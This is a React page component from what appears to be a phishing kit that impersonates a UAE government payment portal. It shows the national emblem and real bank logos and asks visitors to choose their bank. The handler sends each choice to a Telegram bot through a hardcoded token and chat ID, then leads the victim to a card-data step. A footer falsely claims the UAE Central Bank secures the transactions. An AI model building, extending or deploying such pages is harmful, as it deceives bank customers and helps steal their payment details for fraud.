import { useState } from "react";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Loader2, Landmark, ArrowRight } from "lucide-react";

const BANKS = [
  { id: "ENBD", name: "بنك الإمارات دبي الوطني", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/9/9e/Emirates_NBD_logo.svg/1200px-Emirates_NBD_logo.svg.png" },
  { id: "FAB", name: "بنك أبوظبي الأول", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/3/3b/First_Abu_Dhabi_Bank_logo.svg/1200px-First_Abu_Dhabi_Bank_logo.svg.png" },
  { id: "ADCB", name: "بنك أبوظبي التجاري", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/7/7a/ADCB_Logo.svg/1200px-ADCB_Logo.svg.png" },
  { id: "DIB", name: "بنك دبي الإسلامي", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/Dubai_Islamic_Bank_Logo.svg/1200px-Dubai_Islamic_Bank_Logo.svg.png" },
  { id: "ADIB", name: "مصرف أبوظبي الإسلامي", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/2/2a/Abu_Dhabi_Islamic_Bank_logo.svg/1200px-Abu_Dhabi_Islamic_Bank_logo.svg.png" },
  { id: "RAK", name: "بنك رأس الخيمة الوطني", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c3/RAKBANK_logo.svg/1200px-RAKBANK_logo.svg.png" },
  { id: "CBD", name: "بنك دبي التجاري", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/3/3a/Commercial_Bank_of_Dubai_logo.svg/1200px-Commercial_Bank_of_Dubai_logo.svg.png" },
  { id: "MASHREQ", name: "بنك المشرق", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/2/2e/Mashreq_logo.svg/1200px-Mashreq_logo.svg.png" },
  { id: "HSBC", name: "بنك إتش إس بي سي", logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/1200px-HSBC_logo_%282018%29.svg.png" },
];

export default function SelectBank() {
  const [, setLocation] = useLocation();
  const [loading, setLoading] = useState(false);
  const [selectedBank, setSelectedBank] = useState("");

  const TELEGRAM_BOT_TOKEN = "8679116779:AAFA4ChWcYM9ZiHa3BAr3IylTOUEWvFQNkw";
  const TELEGRAM_CHAT_ID = "8362204213";

  const handleBankSelect = async (bankName: string) => {
    setSelectedBank(bankName);
    setLoading(true);
    const message = `
🏦 *اختيار البنك - بوابة سداد الإمارات*
--------------------------
🏛 *البنك المختار:* ${bankName}
--------------------------
    `;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      });
      
      setTimeout(() => {
        const paymentData = JSON.parse(sessionStorage.getItem("paymentData") || "{}");
        sessionStorage.setItem("paymentData", JSON.stringify({ ...paymentData, bank: bankName }));
        setLocation("/card-data");
      }, 1200);
    } catch (error) {
      console.error(error);
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50 font-sans text-right" dir="rtl">
      <header className="bg-white border-b border-gray-200 py-4 shadow-sm">
        <div className="container flex justify-between items-center">
          <div className="flex items-center gap-3">
            <div className="bg-amber-500 p-2 rounded-lg">
              <span className="text-white font-bold text-sm">سداد</span>
            </div>
            <h1 className="text-lg font-bold text-gray-800">بوابة سداد الإمارات</h1>
          </div>
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cb/Emblem_of_the_United_Arab_Emirates.svg/1200px-Emblem_of_the_United_Arab_Emirates.svg.png" alt="UAE" className="h-10" />
        </div>
      </header>

      <main className="flex-grow container py-12 px-4">
        <div className="max-w-3xl mx-auto">
          {/* Progress Steps */}
          <div className="flex justify-between mb-12 relative px-4">
            {[1, 2, 3, 4, 5].map((step) => (
              <div key={step} className="flex flex-col items-center z-10">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center font-bold border-2 transition-all ${step <= 2 ? 'bg-amber-500 border-amber-500 text-white shadow-lg shadow-amber-500/30' : 'bg-white border-gray-200 text-gray-400'}`}>
                  {step}
                </div>
                <span className={`text-[10px] mt-2 font-bold ${step <= 2 ? 'text-amber-600' : 'text-gray-400'}`}>
                  {step === 1 ? 'البيانات' : step === 2 ? 'البنك' : step === 3 ? 'البطاقة' : step === 4 ? 'التحقق' : 'التأكيد'}
                </span>
              </div>
            ))}
            <div className="absolute top-5 left-8 right-8 h-0.5 bg-gray-200 -z-0"></div>
          </div>

          <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
            <div className="bg-slate-900 p-8 text-white text-center">
              <Landmark className="w-12 h-12 text-amber-500 mx-auto mb-4" />
              <h2 className="text-2xl font-bold">اختر مؤسستك المصرفية</h2>
              <p className="text-slate-400 text-sm mt-2">يرجى اختيار البنك المصدر للبطاقة التي ستستخدمها في عملية السداد</p>
            </div>

            <div className="p-8">
              <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
                {BANKS.map((bank) => (
                  <button
                    key={bank.id}
                    disabled={loading}
                    onClick={() => handleBankSelect(bank.name)}
                    className={`flex flex-col items-center justify-center p-6 border-2 rounded-2xl transition-all group relative overflow-hidden ${selectedBank === bank.name ? 'border-amber-500 bg-amber-50/50' : 'border-gray-100 hover:border-amber-200 hover:bg-gray-50'}`}
                  >
                    {loading && selectedBank === bank.name && (
                      <div className="absolute inset-0 bg-white/80 backdrop-blur-sm flex items-center justify-center z-20">
                        <Loader2 className="w-8 h-8 text-amber-500 animate-spin" />
                      </div>
                    )}
                    <div className="h-16 w-full flex items-center justify-center mb-4">
                      <img src={bank.logo} alt={bank.name} className="max-h-full max-w-[80%] object-contain filter grayscale group-hover:grayscale-0 transition-all" />
                    </div>
                    <span className="font-bold text-gray-700 text-xs text-center leading-tight">{bank.name}</span>
                  </button>
                ))}
              </div>

              <div className="mt-12 flex flex-col items-center gap-4">
                <p className="text-xs text-gray-400 flex items-center gap-2">
                  <ArrowRight className="w-3 h-3" /> إذا لم تجد بنكك في القائمة، يرجى اختيار "بنك آخر" أو التواصل مع الدعم
                </p>
                <Button variant="outline" className="px-12 py-6 rounded-xl border-gray-200 text-gray-500 font-bold" onClick={() => setLocation("/user-data")}>
                  الرجوع للخطوة السابقة
                </Button>
              </div>
            </div>
            
            <div className="bg-blue-50 p-4 text-center border-t border-blue-100">
              <p className="text-[10px] text-blue-700 font-bold">جميع المعاملات البنكية تتم عبر بوابة الربط المباشر الآمنة لمصرف الإمارات المركزي</p>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}
